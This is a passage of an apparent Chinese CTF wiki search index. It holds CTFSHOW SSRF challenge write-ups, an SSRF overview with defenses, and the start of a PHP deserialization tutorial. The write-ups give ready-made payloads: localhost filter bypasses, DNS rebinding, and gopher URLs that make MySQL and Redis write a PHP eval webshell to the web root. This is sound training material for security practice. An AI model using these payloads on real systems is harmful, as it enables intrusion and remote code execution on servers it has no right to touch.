\u5730\u5740\u5199\u6cd5\u4e5f\u884c \u5341\u516d\u8fdb\u5236 url=http://0x7F.0.0.1/flag.php \u516b\u8fdb\u5236 url=http://0177.0.0.1/flag.php 10 \u8fdb\u5236\u6574\u6570\u683c\u5f0f url=http://2130706433/flag.php 16 \u8fdb\u5236\u6574\u6570\u683c\u5f0f\uff0c\u8fd8\u662f\u4e0a\u9762\u90a3\u4e2a\u7f51\u7ad9\u8f6c\u6362\u8bb0\u5f97\u524d\u7f000x url=http://0x7F000001/flag.php \u8fd8\u6709\u4e00\u79cd\u7279\u6b8a\u7684\u7701\u7565\u6a21\u5f0f 127.0.0.1\u5199\u6210127.1 \u7528CIDR\u7ed5\u8fc7localhost url=http://127.127.127.127/flag.php \u8fd8\u6709\u5f88\u591a\u65b9\u5f0f\u4e0d\u60f3\u591a\u5199\u4e86 url=http://0/flag.php url=http://0.0.0.0/flag.php","title":"web352-353"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web354","text":"DNS-Rebinding\u653b\u51fb\u7ed5\u8fc7 url=http://r.xxxzc8.ceye.io/flag.php \u81ea\u5df1\u53bbceye.io\u6ce8\u518c\u7ed1\u5b9a127.0.0.1\u7136\u540e\u8bb0\u5f97\u524d\u9762\u52a0r 302\u8df3\u8f6c\u7ed5\u8fc7\u4e5f\u884c\uff0c\u5728\u81ea\u5df1\u7684\u7f51\u7ad9\u4e3b\u9875\u52a0\u4e0a\u8fd9\u4e2a <?php header(\"Location:http://127.0.0.1/flag.php\"); \u6216\u8005\u8bf4\u7fa4\u4e3b\u8bf4\u6211\u4e27\u5fc3\u75c5\u72c2\u7684\u65b9\u5f0f \u6211\u81ea\u5df1\u7684\u57df\u540dA\u8bb0\u5f55\u8bbe\u4e3a\u4e86127.0.0.1 \u6216\u8005\u6709\u4e2a\u73b0\u6210\u7684A\u8bb0\u5f55\u662f127.0.0.1\u7684\u7f51\u7ad9 url=http://sudo.cc/flag.php","title":"web354"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web355","text":"\u8bbe\u7f6e\u4e86$host<5\u7684\u9650\u5236\uff0c\u968f\u4fbf\u6765\u4e2a\u5229\u7528127.0.0.1=127.1\u521a\u597d\u662f5\u4f4d url=http://127.1/flag.php","title":"web355"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web356","text":"\u66f4\u7edd\u4e86\u9650\u5236$host<3\uff0c\u8001\u89c4\u77e9 url=http://0/flag.php","title":"web356"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web357","text":"\u5173\u952e\u4ee3\u7801\uff0c\u4e0d\u80fd\u662f\u4e00\u4e9b\u79c1\u6709\u5730\u5740 if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { die('ip!'); } FILTER_FLAG_IPV4 - \u8981\u6c42\u503c\u662f\u5408\u6cd5\u7684 IPv4 IP\uff08\u6bd4\u5982 255.255.255.255\uff09 FILTER_FLAG_IPV6 - \u8981\u6c42\u503c\u662f\u5408\u6cd5\u7684 IPv6 IP\uff08\u6bd4\u5982 2001:0db8:85a3:08d3:1319:8a2e:0370:7334\uff09 FILTER_FLAG_NO_PRIV_RANGE - \u8981\u6c42\u503c\u662f RFC \u6307\u5b9a\u7684\u79c1\u57df IP \uff08\u6bd4\u5982 192.168.0.1\uff09 FILTER_FLAG_NO_RES_RANGE - \u8981\u6c42\u503c\u4e0d\u5728\u4fdd\u7559\u7684 IP \u8303\u56f4\u5185\u3002\u8be5\u6807\u5fd7\u63a5\u53d7 IPV4 \u548c IPV6 \u503c\u3002 \u7528web354\u8bf4\u8fc7\u7684DNS-Rebinding\u4e0e302\u8df3\u8f6c\u5373\u53ef\u89e3\u9898","title":"web357"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web358","text":"\u9650\u5236\u662f\u8fd9\u4e2a if(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){ echo file_get_contents($url); } blackhat\u8bae\u9898\u52a0\u4e0aurl\u89e3\u6790\u7279\u6027php\u7684curl\u9ed8\u8ba4\u662f@\u540e\u9762\u7684\u90e8\u5206\u52a0\u4e0a?url\u89e3\u6790\u7684\u65f6\u5019\u4f1a\u628a\u4ed6\u5f53\u6210url\u89e3\u6790\u7684get\u8bf7\u6c42\u53c2\u6570 url=http://ctf.@127.0.0.1/flag.php?.show","title":"web358"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web359","text":"\u4f7f\u7528\u5de5\u5177gopherus\u751f\u6210\u5373\u53ef\uff0c \u5de5\u5177\u5730\u5740 Give MySQL username: root Give query to execute: select '<?php eval($_POST[pass]); ?>' INTO OUTFILE '/var/www/html/2.php'; gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01 \u7136\u540e\u6ce8\u610f \u8fd9\u90e8\u5206url\u9700\u8981\u7279\u6b8a\u5b57\u7f16\u7801\uff0ccurl\u4f1a\u9ed8\u8ba4\u89e3\u7801\u4e00\u6b21 %a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01","title":"web359"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web360","text":"\u6ca1\u5565\u597d\u8bf4\u7684gopher\u6253redis url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255Bpass%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A \u7136\u540e\u8bbf\u95eeshell.php\uff0c\u91cc\u9762\u7684\u5185\u5bb9\u662f\u8fd9\u4e2a <?php eval($_POST[pass]); ?>","title":"web360"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/","text":"SSRF\u4ecb\u7ecd \u00b6 SSRF\u7b80\u4ecb \u00b6 SSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002 \u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09 \u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0 \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09 \u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49 \u5e38\u89c1\u7684\u6f0f\u6d1e\u4ea7\u751f \u00b6 curl file_get_contents fsockopen \u5229\u7528\u65b9\u5f0f \u00b6 \u4e00\u822c\u914d\u5408\u4e00\u4e9b\u534f\u8bae\u8fdb\u884c\u653b\u51fb file\u534f\u8bae dict\u534f\u8bae gopher\u534f\u8bae http\u4e0ehttps\u534f\u8bae \u5371\u5bb3 \u00b6 \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f; \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09; \u5bf9\u5185\u7f51 web \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0; \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 get \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 struts2\uff0csqli \u7b49\uff09; \u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49\u3002 \u5982\u4f55\u9632\u5fa1 \u00b6 \u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528 \u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies & User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528 \u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u4e3a http \u5e38\u7528\u7684\u7aef\u53e3\uff0c\u6bd4\u5982\uff0c80,443,8080,8090\u3002 \u7981\u7528\u4e0d\u9700\u8981\u7684\u534f\u8bae\u3002\u4ec5\u4ec5\u5141\u8bb8 http \u548c https \u8bf7\u6c42\u3002\u53ef\u4ee5\u9632\u6b62\u7c7b\u4f3c\u4e8e file:///,gopher://,ftp:// \u7b49\u5f15\u8d77\u7684\u95ee\u9898\u3002 \u7edf\u4e00\u9519\u8bef\u4fe1\u606f\uff0c\u907f\u514d\u7528\u6237\u53ef\u4ee5\u6839\u636e\u9519\u8bef\u4fe1\u606f\u6765\u5224\u65ad\u8fdc\u7aef\u670d\u52a1\u5668\u7684\u7aef\u53e3\u72b6\u6001\u3002 \u5176\u4ed6 \u00b6 file\u534f\u8bae\u4e0ehttp\u534f\u8bae\u7684\u533a\u522b \u00b6 \uff081\uff09file\u534f\u8bae\u4e3b\u8981\u7528\u4e8e\u8bfb\u53d6\u670d\u52a1\u5668\u672c\u5730\u6587\u4ef6\uff0c\u8bbf\u95ee\u7684\u662f\u672c\u5730\u7684\u9759\u6001\u8d44\u6e90 \uff082\uff09http\u662f\u8bbf\u95ee\u672c\u5730\u7684html\u6587\u4ef6\uff0c\u7b80\u5355\u6765\u8bf4file\u53ea\u80fd\u9759\u6001\u8bfb\u53d6\uff0chttp\u53ef\u4ee5\u52a8\u6001\u89e3\u6790 \uff083\uff09http\u670d\u52a1\u5668\u53ef\u4ee5\u5f00\u653e\u7aef\u53e3\uff0c\u8ba9\u4ed6\u4eba\u901a\u8fc7http\u8bbf\u95ee\u670d\u52a1\u5668\u8d44\u6e90\uff0c\u4f46file\u4e0d\u53ef\u4ee5 \uff084\uff09file\u5bf9\u5e94\u7684\u7c7b\u4f3chttp\u7684\u534f\u8bae\u662fftp\u534f\u8bae\uff08\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 \uff085\uff09file\u4e0d\u80fd\u8de8\u57df \u53c2\u8003\u6587\u7ae0 \u00b6 CTF Wiki SSRF\u6f0f\u6d1e\u7528\u5230\u7684\u5176\u4ed6\u534f\u8bae\uff08dict\u534f\u8bae\uff0cfile\u534f\u8bae\uff09","title":"SSRF\u4ecb\u7ecd"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#ssrf","text":"","title":"SSRF\u4ecb\u7ecd"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#ssrf_1","text":"SSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002 \u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09 \u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0 \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09 \u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49","title":"SSRF\u7b80\u4ecb"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#_1","text":"curl file_get_contents fsockopen","title":"\u5e38\u89c1\u7684\u6f0f\u6d1e\u4ea7\u751f"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#_2","text":"\u4e00\u822c\u914d\u5408\u4e00\u4e9b\u534f\u8bae\u8fdb\u884c\u653b\u51fb file\u534f\u8bae dict\u534f\u8bae gopher\u534f\u8bae http\u4e0ehttps\u534f\u8bae","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#_3","text":"\u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f; \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09; \u5bf9\u5185\u7f51 web \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0; \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 get \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 struts2\uff0csqli \u7b49\uff09; \u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49\u3002","title":"\u5371\u5bb3"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#_4","text":"\u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528 \u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies & User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528 \u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u4e3a http \u5e38\u7528\u7684\u7aef\u53e3\uff0c\u6bd4\u5982\uff0c80,443,8080,8090\u3002 \u7981\u7528\u4e0d\u9700\u8981\u7684\u534f\u8bae\u3002\u4ec5\u4ec5\u5141\u8bb8 http \u548c https \u8bf7\u6c42\u3002\u53ef\u4ee5\u9632\u6b62\u7c7b\u4f3c\u4e8e file:///,gopher://,ftp:// \u7b49\u5f15\u8d77\u7684\u95ee\u9898\u3002 \u7edf\u4e00\u9519\u8bef\u4fe1\u606f\uff0c\u907f\u514d\u7528\u6237\u53ef\u4ee5\u6839\u636e\u9519\u8bef\u4fe1\u606f\u6765\u5224\u65ad\u8fdc\u7aef\u670d\u52a1\u5668\u7684\u7aef\u53e3\u72b6\u6001\u3002","title":"\u5982\u4f55\u9632\u5fa1"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#_5","text":"","title":"\u5176\u4ed6"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#filehttp","text":"\uff081\uff09file\u534f\u8bae\u4e3b\u8981\u7528\u4e8e\u8bfb\u53d6\u670d\u52a1\u5668\u672c\u5730\u6587\u4ef6\uff0c\u8bbf\u95ee\u7684\u662f\u672c\u5730\u7684\u9759\u6001\u8d44\u6e90 \uff082\uff09http\u662f\u8bbf\u95ee\u672c\u5730\u7684html\u6587\u4ef6\uff0c\u7b80\u5355\u6765\u8bf4file\u53ea\u80fd\u9759\u6001\u8bfb\u53d6\uff0chttp\u53ef\u4ee5\u52a8\u6001\u89e3\u6790 \uff083\uff09http\u670d\u52a1\u5668\u53ef\u4ee5\u5f00\u653e\u7aef\u53e3\uff0c\u8ba9\u4ed6\u4eba\u901a\u8fc7http\u8bbf\u95ee\u670d\u52a1\u5668\u8d44\u6e90\uff0c\u4f46file\u4e0d\u53ef\u4ee5 \uff084\uff09file\u5bf9\u5e94\u7684\u7c7b\u4f3chttp\u7684\u534f\u8bae\u662fftp\u534f\u8bae\uff08\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 \uff085\uff09file\u4e0d\u80fd\u8de8\u57df","title":"file\u534f\u8bae\u4e0ehttp\u534f\u8bae\u7684\u533a\u522b"},{"location":"CTFWiki/Web/SSRF/SSRF\u7b80\u8981\u4ecb\u7ecd/#_6","text":"CTF Wiki SSRF\u6f0f\u6d1e\u7528\u5230\u7684\u5176\u4ed6\u534f\u8bae\uff08dict\u534f\u8bae\uff0cfile\u534f\u8bae\uff09","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/","text":"PHP\u53cd\u5e8f\u5217\u5316 \u00b6 \u7b80\u4ecb \u00b6 \u5e8f\u5217\u5316\u5176\u5b9e\u5c31\u662f\u5c06\u6570\u636e\u8f6c\u5316\u6210\u4e00\u79cd\u53ef\u9006\u7684\u6570\u636e\u7ed3\u6784\uff0c\u81ea\u7136\uff0c\u9006\u5411\u7684\u8fc7\u7a0b\u5c31\u53eb\u505a\u53cd\u5e8f\u5217\u5316\u3002 \u5728\u7f51\u4e0a\u627e\u5230\u4e00\u4e2a\u6bd4\u8f83\u5f62\u8c61\u7684\u4f8b\u5b50 \u6bd4\u5982\uff1a\u73b0\u5728\u6211\u4eec\u90fd\u4f1a\u5728\u6dd8\u5b9d\u4e0a\u4e70\u684c\u5b50\uff0c\u684c\u5b50\u8fd9\u79cd\u5f88\u4e0d\u89c4\u5219\u7684\u4e1c\u897f\uff0c\u8be5\u600e\u4e48\u4ece\u4e00\u4e2a\u57ce\u5e02\u8fd0\u8f93\u5230\u53e6\u4e00\u4e2a\u57ce\u5e02\uff0c\u8fd9\u65f6\u5019\u4e00\u822c\u90fd\u4f1a\u628a\u5b83\u62c6\u6389\u6210\u677f\u5b50\uff0c\u518d\u88c5\u5230\u7bb1\u5b50\u91cc\u9762\uff0c\u5c31\u53ef\u4ee5\u5feb\u9012\u5bc4\u51fa\u53bb\u4e86\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u7c7b\u4f3c\u6211\u4eec\u7684\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\uff08\u628a\u6570\u636e\u8f6c\u5316\u4e3a\u53ef\u4ee5\u5b58\u50a8\u6216\u8005\u4f20\u8f93\u7684\u5f62\u5f0f\uff09\u3002\u5f53\u4e70\u5bb6\u6536\u5230\u8d27\u540e\uff0c\u5c31\u9700\u8981\u81ea\u5df1\u628a\u8fd9\u4e9b\u677f\u5b50\u7ec4\u88c5\u6210\u684c\u5b50\u7684\u6837\u5b50\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u50cf\u53cd\u5e8f\u5217\u7684\u8fc7\u7a0b\uff08\u8f6c\u5316\u6210\u5f53\u521d\u7684\u6570\u636e\u5bf9\u8c61\uff09\u3002 php \u5c06\u6570\u636e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4f1a\u7528\u5230\u4e24\u4e2a\u51fd\u6570 serialize \u5c06\u5bf9\u8c61\u683c\u5f0f\u5316\u6210\u6709\u5e8f\u7684\u5b57\u7b26\u4e32 unserialize \u5c06\u5b57\u7b26\u4e32\u8fd8\u539f\u6210\u539f\u6765\u7684\u5bf9\u8c61 \u5e8f\u5217\u5316\u7684\u76ee\u7684\u662f\u65b9\u4fbf\u6570\u636e\u7684\u4f20\u8f93\u548c\u5b58\u50a8\uff0c\u5728PHP\u4e2d\uff0c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e00\u822c\u7528\u505a\u7f13\u5b58\uff0c\u6bd4\u5982session\u7f13\u5b58\uff0ccookie\u7b49\u3002 \u5e38\u89c1\u7684\u5e8f\u5217\u5316\u683c\u5f0f \u00b6 \u4e86\u89e3\u5373\u53ef \u4e8c\u8fdb\u5236\u683c\u5f0f \u5b57\u8282\u6570\u7ec4 json\u5b57\u7b26\u4e32 xml\u5b57\u7b26\u4e32 \u6848\u4f8b\u5f15\u5165 \u00b6 \u7b80\u5355\u7684\u4f8b\u5b50(\u4ee5\u6570\u7ec4\u4e3a\u4f8b\u5b50) <?php $user = array ( 'xiao' , 'shi' , 'zi' ); $user = serialize ( $user ); echo ( $user . PHP_EOL ); print_r ( unserialize ( $user )); \u4ed6\u4f1a\u8f93\u51fa a:3:{i:0;s:4:\"xiao\";i:1;s:3:\"shi\";i:2;s:2:\"zi\";} Array ( [0] => xiao [1] => shi [2] => zi ) \u6211\u4eec\u5bf9\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u505a\u4e2a\u7b80\u5355\u8bb2\u89e3\uff0c\u65b9\u4fbf\u5927\u5bb6\u5165\u95e8 a:3:{i:0;s:4:\"xiao\";i:1;s:3:\"shi\";i:2;s:2:\"zi\";} a:array\u4ee3\u8868\u662f\u6570\u7ec4\uff0c\u540e\u9762\u76843\u8bf4\u660e\u6709\u4e09\u4e2a\u5c5e\u6027 i:\u4ee3\u8868\u662f\u6574\u578b\u6570\u636eint\uff0c\u540e\u9762\u76840\u662f\u6570\u7ec4\u4e0b\u6807 s:\u4ee3\u8868\u662f\u5b57\u7b26\u4e32\uff0c\u540e\u9762\u76844\u662f\u56e0\u4e3axiao\u957f\u5ea6\u4e3a4 \u4f9d\u6b21\u7c7b\u63a8 \u5e8f\u5217\u5316\u540e\u7684\u5185\u5bb9\u53ea\u6709\u6210\u5458\u53d8\u91cf\uff0c\u6ca1\u6709\u6210\u5458\u51fd\u6570\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50 <?php class test{ public $a; public $b; function __construct(){$this->a = \"xiaoshizi\";$this->b=\"laoshizi\";} function happy(){return $this->a;} } $a = new test(); echo serialize($a); ?> \u8f93\u51fa(O\u4ee3\u8868Object\u662f\u5bf9\u8c61\u7684\u610f\u601d\uff0c\u4e5f\u662f\u7c7b) O:4:\"test\":2:{s:1:\"a\";s:9:\"xiaoshizi\";s:1:\"b\";s:8:\"laoshizi\";} \u800c\u5982\u679c\u53d8\u91cf\u524d\u662fprotected\uff0c\u5219\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a \\x00*\\x00 ,private\u5219\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a \\x00\u7c7b\u540d\\x00 ,\u8f93\u51fa\u65f6\u4e00\u822c\u9700\u8981url\u7f16\u7801\uff0c\u82e5\u5728\u672c\u5730\u5b58\u50a8\u66f4\u63a8\u8350\u91c7\u7528base64\u7f16\u7801\u7684\u5f62\u5f0f\uff0c\u5982\u4e0b\uff1a <?php class test { protected $a ; private $b ; function __construct (){ $this -> a = \"xiaoshizi\" ; $this -> b = \"laoshizi\" ;} function happy (){ return $this -> a ;} } $a = new test (); echo serialize ( $a ); echo urlencode ( serialize ( $a )); ?> \u8f93\u51fa\u5219\u4f1a\u5bfc\u81f4\u4e0d\u53ef\u89c1\u5b57\u7b26 \\x00 \u7684\u4e22\u5931 O:4:\"test\":2:{s:4:\" * a\";s:9:\"xiaoshizi\";s:7:\" test b\";s:8:\"laoshizi\";} \u53cd\u5e8f\u5217\u5316\u4e2d\u5e38\u89c1\u7684\u9b54\u672f\u65b9\u6cd5 \u00b6 __wakeup() //\u6267\u884cunserialize()\u65f6\uff0c\u5148\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 __sleep() 